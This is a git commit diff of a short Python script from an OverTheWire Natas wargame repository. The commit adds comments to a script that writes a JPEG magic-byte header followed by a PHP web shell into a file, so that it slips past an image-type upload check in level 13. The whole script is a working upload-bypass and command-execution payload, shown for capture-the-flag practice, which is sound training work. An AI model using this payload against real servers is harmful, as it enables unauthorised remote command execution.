883192c4530d530f2e34bcc8f43e5c210f5b7b03
gtrven <33815478+gtrven@users.noreply.github.com>
2018-10-17 18:09:24 -0700

    Update exif_imagetype_bypass.py

--- OverTheWire/Natas/Scripts/exif_imagetype_bypass.py
+++ OverTheWire/Natas/Scripts/exif_imagetype_bypass.py
@@ -1,3 +1,7 @@
-fh = open('natas13.php','w')  
-fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
-fh.close() 
+#make sure you have a blank file called "natas13.php" to write this into.
+#this program writes in the hex signature for JPG files into natas13.php, then follows it with php code, which 
+#bypasses the exif_filetype() function used to make sure you only upload a jpg in level 13.
+
+writer = open('natas13.php','w')  
+writer.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
+writer.close() 
